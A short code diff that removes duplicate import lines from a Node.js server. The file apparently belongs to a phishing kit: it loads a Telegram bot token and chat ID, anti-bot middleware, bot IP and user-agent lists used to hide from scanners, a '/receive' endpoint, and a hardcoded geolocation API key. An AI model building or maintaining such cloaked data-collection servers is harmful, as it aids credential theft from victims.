@@ -5,7 +5,6 @@ const path = require('path');
 const { botToken, chatId } = require('./Config/settings.js');
 const antibot = require('./middleware/antibot');
 const ipRangeCheck = require('ip-range-check');
-const requestIP = require('request-ip');
 const axios = require('axios');
 const ApiKey = 'bdc_4422bb94409c46e986818d3e9f3b2bc2';
 const URL = `https://api-bdc.net/data/ip-geolocation?ip=`;
@@ -89,8 +88,6 @@ app.post('/receive', async(req, res) => {
 
 
 const isbot = require('isbot');
-const ipRangeCheck = require('ip-range-check');
-const { getClientIp } = require('request-ip');
 const { botUAList } = require('./config/botUA.js');
 const { botIPList, botIPRangeList, botIPCIDRRangeList, botIPWildcardRangeList } = require('./config/botIP.js');
 const { botRefList } = require('./config/botRef.js');
